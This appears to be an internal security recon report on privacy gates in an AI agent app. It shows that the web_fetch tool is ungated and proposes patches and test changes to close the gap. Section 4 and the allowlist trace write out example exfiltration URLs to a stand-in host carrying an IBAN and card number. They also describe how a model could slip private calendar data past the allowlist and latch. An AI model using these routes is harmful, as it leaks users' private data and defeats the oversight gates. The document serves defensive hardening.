# B3 — TOOL GATE GAPS MAP (egress privacy)

**Branch:** `feat/moe-stream` · **Date:** 2026-09-04 · **Mode:** read-only recon

---

## 1. TOOL_ENTRIES gateTable status

| Tool | gateTable | File:Line |
|---|---|---|
| `web_search` | `TOOL_GATE_TABLE` (4 rules) | `src/agent/toolRegistry.ts:74` |
| `web_fetch` | **`null`** | `src/agent/toolRegistry.ts:81` |
| `document_chat` | `null` | `src/agent/toolRegistry.ts:87` |
| `device_info` | `null` | `src/agent/toolRegistry.ts:93` |
| `device_calc` | `null` | `src/agent/toolRegistry.ts:99` |
| `calendar_agenda` | `CALENDAR_GATE_TABLE` (1 rule) | `src/agent/toolRegistry.ts:106` |

Comment at `src/agent/toolRegistry.ts:11`:
> "Do not gate web_fetch here unless its separate follow-up is implemented."

---

## 2. Does runToolGate run for web_fetch? — **NO.**

Two independent blocks prevent it:

**A. `resolveToolGateTable` returns `undefined` for web_fetch.**
`src/rules/toolGateRegistry.ts:27-29`:
```ts
export function resolveToolGateTable(toolName, expand) {
  if (!expand && toolName !== "web_search") return undefined;
  return TOOL_GATE_REGISTRY[toolName];   // web_fetch absent from registry → undefined
}
```
`web_fetch` has `gateTable: null` so it is never added to `TOOL_GATE_REGISTRY` (lines 17-20). Even with `expand=true`, the lookup key doesn't exist → `undefined`.

**B. AppShell executeTool calls `runToolGate` unconditionally, but it short-circuits.**
`src/app/AppShell.tsx:1988-1994`:
```ts
const gate = (await getToolGateEnabled())
  ? await runToolGate({ toolName: name, args, ... })
  : { blocked: false };
```
`runToolGate` (src/rules/runToolGate.ts:70-72) resolves `undefined` table → returns `{ blocked: false }` immediately.

**Conclusion:** `runToolGate` is *called* for every tool, but for `web_fetch` it does nothing — the resolved table is `undefined`.

---

## 3. web_fetch args — what could be scanned

`src/agent/webFetchTool.ts:349-353` defines the parameter schema:
```ts
properties: {
  url:   { type: "string", description: "Web page or PDF URL…" },
  query: { type: "string", description: "What you want to find in the page…" },
},
required: ["url", "query"],
```

**Neither `url` nor `query` is scanned by `containsSensitivePattern` or `containsPrivateData`.**
The gate is absent (gateTable=null), so `snapshotInput` (runToolGate.ts:43) never runs for web_fetch. Even if a table existed, `snapshotInput` spreads `...args` for non-web_search tools (line 43), meaning `input.url` and `input.query` would both be available to rules — but no rules evaluate them today.

---

## 4. Can a model exfiltrate IBAN/CC via web_fetch URL?

**Yes.** Two orthogonal blocks exist, but neither scans for sensitive content:

### 4a. FetchAllowlist (URL-only, no content scan)
`src/app/AppShell.tsx:1877-1886`:
```ts
const ensureAllowlistForTurn = (lastUserMessage?) => {
  allowlist = makeFetchAllowlist();
  if (lastUserMessage) allowlist.addFromText(lastUserMessage);
  fetchExec = makeWebFetchExecutor(locale, allowlist, fetchDeps);
};
```
Allowlist is seeded from:
1. `http(s)` URLs extracted from the user message (`URL_IN_TEXT_RE` in webFetchTool.ts:168)
2. `web_search` result URLs added post-search (`AppShell.tsx:2000-2005`)

**Gap:** The model can call `web_fetch` with any URL already on the allowlist. If the user pasted `https://evil.example.com/log` or if a search result pointed there, the model can send `url="https://evil.example.com/log?iban=DE89370400440532013000&cc=4111111111111111"` and `query="relevant content"`. The allowlist only validates the **host**, not the query-string payload. The `isPubliclyRoutableHttpUrl` gate (webFetchTool.ts:410-480) accepts any query-string on an allowlisted host.

### 4b. `query` parameter is user-controlled text
The `query` param controls what passages are extracted from the page — but the raw URL (including any PII in the query string) hits the network before extraction. The model can embed IBAN, CC, email, phone numbers into the URL path or query string, and they leave the device via the HTTP request.

### 4c. privateSearchLatch does NOT apply to web_fetch
`AppShell.tsx:1982`: the latch only blocks `web_search` after `device_info`/`calendar_agenda`. `web_fetch` has no equivalent latch, so a model could call `web_fetch` immediately after a private tool call without restraint.

---

## 5. echo-of-memory-fact / echo-of-context — web_search only

These rules live exclusively in `TOOL_GATE_TABLE` (`src/rules/toolGate.ts:68-101`), which is only assigned to `web_search`.

`echo-of-context` (toolGate.ts:72-89): blocks when `query` is unrelated to `lastUserMessage`. Uses cosine similarity on n-grams. Requires `input.query` and `input.lastUserMessage` — both present for web_search via `snapshotInput`.

`echo-of-memory-fact` (toolGate.ts:92-101): blocks when `query` contains a memory fact's private data. Requires `input.query` and `input.memoryFacts`.

**Neither applies to any other tool.** `calendar_agenda` has its own gate (`CALENDAR_GATE_TABLE`) with only a `calendar-private-data` rule (private data in *any* string field vs. memory facts).

---

## 6. calendar_agenda gate — residual egress risk

`CALENDAR_GATE_TABLE` (`src/rules/calendarGate.ts:14-27`) has one rule:
```ts
id: "calendar-private-data"
condition: (input) → containsPrivateData(any string field, memoryFact)
action: { kind: "block", reason: "private-data" }
```

**Residual risks:**
- **Egress of calendar content itself:** The gate blocks when *memory facts* (user-stored private data) leak into calendar args. It does NOT block the calendar from returning real calendar entries to the model. The model can then put calendar content into a subsequent `web_search` or `web_fetch` call — the sensitive-pattern gate on web_search would catch IBAN/CC in the query, but plain calendar text (names, event titles) flows freely.
- **privateSearchLatch covers web_search after calendar_agenda** (`AppShell.tsx:1982`), preventing a follow-up web_search in the same turn. But `web_fetch` is NOT latched — the model could call `web_fetch` with a URL already on the allowlist (from a prior search) and embed calendar content in the query parameter.

---

## 7. Minimal patch set to gate web_fetch for sensitive patterns

### Patch A: Add a RuleTable for web_fetch (Effort: **S**)
Create `src/rules/webFetchGate.ts`:
```ts
export const WEB_FETCH_GATE_TABLE: RuleTable = {
  rules: [{
    id: "sensitive-pattern-in-url-or-query",
    priority: 25,
    condition: (input) => {
      const url   = typeof input.url   === "string" ? input.url   : "";
      const query = typeof input.query === "string" ? input.query : "";
      return containsSensitivePattern(url) || containsSensitivePattern(query);
    },
    action: { kind: "block", reason: "sensitive-pattern-in-url-or-query" },
  }],
};
```

### Patch B: Wire the table into TOOL_ENTRIES (Effort: **XS**)
`src/agent/toolRegistry.ts:81`: change `gateTable: null` → `gateTable: WEB_FETCH_GATE_TABLE`.

### Patch C: Ensure snapshotInput handles web_fetch correctly (Effort: **XS**)
`src/rules/runToolGate.ts:29-44`: `snapshotInput` already spreads `...args` for non-web_search tools, so `input.url` and `input.query` will be available. **No change needed** — just verify.

### Patch D: Verify resolveToolGateTable picks it up (Effort: **XS**)
Since `WEB_FETCH_GATE_TABLE` is non-null on the entry, `TOOL_GATE_REGISTRY` auto-includes it (toolGateRegistry.ts:17-20). `resolveToolGateTable("web_fetch", false)` returns `undefined` (expand-off, non-web_search path at line 28). **This is correct** — sensitive-pattern gate fires only when expand=true. If the requirement is "always fire regardless of expand," add a short-circuit similar to web_search's (line 28: `|| toolName !== "web_search"` → `|| !["web_search","web_fetch"].includes(toolName)`).

### Optional Patch E: Add privateSearchLatch for web_fetch (Effort: **S**)
`src/app/AppShell.tsx:1982`: extend the latch check to also block `web_fetch` after private tools, or at minimum fire runToolGate on the URL+query.

### Summary table

| Patch | File | What | Effort |
|---|---|---|---|
| A | `src/rules/webFetchGate.ts` (new) | RuleTable with `containsSensitivePattern(url \|\| query)` | S |
| B | `src/agent/toolRegistry.ts:81` | `gateTable: null` → `gateTable: WEB_FETCH_GATE_TABLE` | XS |
| C | `src/rules/runToolGate.ts:43` | No change needed — spread already works | XS (verify) |
| D | `src/rules/toolGateRegistry.ts:28` | Optionally bypass expand-gate for web_fetch | XS |
| E | `src/app/AppShell.tsx:1982` | Extend privateSearchLatch to web_fetch | S |

---

## 8. Tests that assert web_fetch is ungated — must flip

| File | Line | Assertion |
|---|---|---|
| `src/rules/toolGateRegistry.test.ts:31` | `expect(resolveToolGateTable("web_fetch", true)).toBeUndefined()` |

This is the **only** test that explicitly asserts web_fetch is ungated. It must change to `expect(resolveToolGateTable("web_fetch", true)).toBe(WEB_FETCH_GATE_TABLE)`.

No other test file references `web_fetch` in a gate context. The `toolRegistry.test.ts` references are structural (tool name ordering), not gate assertions.

---

## 9. expand=false behavior — should sensitive gate fire regardless?

### Current behavior
`resolveToolGateTable` (`src/rules/toolGateRegistry.ts:27-30`):
```ts
if (!expand && toolName !== "web_search") return undefined;
return TOOL_GATE_REGISTRY[toolName];
```
- `expand=false` + `web_fetch` → `undefined` → **no gate**
- `expand=true` + `web_fetch` + non-null table → table resolves → gate fires

### Should sensitive gate fire regardless of expand?

**Yes.** The expand flag controls the *privacy audit UX* (warn notes, audit log writes). The `sensitive-pattern-in-query` rule is a **hard block** (not a warn), so it should fire regardless of whether the user has toolhelp expanded. The current design already makes this exception for `web_search` (`toolName !== "web_search"` bypasses the expand check). The same bypass should apply to `web_fetch`.

**Recommendation:** Change line 28 to:
```ts
if (!expand && toolName !== "web_search" && toolName !== "web_fetch") return undefined;
```
This keeps the audit/warn path gated by expand while ensuring sensitive-pattern blocks always fire. (Effort: **XS**, 1 line in `src/rules/toolGateRegistry.ts:28`)

---

## Cross-reference: allowlist seeding trace

The full allowlist lifecycle:

1. **Turn start:** `fetchAllowlistTurnSeq` incremented (`AppShell.tsx:4232`).
2. **executeTool entry:** `ensureAllowlistForTurn(rawUserText)` called (`AppShell.tsx:1949`).
3. **Seed:** `allowlist.addFromText(lastUserMessage)` extracts `http(s)` URLs from user text (`webFetchTool.ts:462-469`).
4. **Post web_search:** search result URLs added (`AppShell.tsx:2001-2004`).
5. **web_fetch call:** `allowlist.has(url)` checked (`webFetchTool.ts:534`). If absent → blocked. If present → network fires.

**The allowlist gates *which hosts* are reachable, not *what data* is sent.** A model can craft `https://allowlisted-host.com/exfil?data=<sensitive>` and the allowlist permits it as long as the host was previously seen in search results or user text.
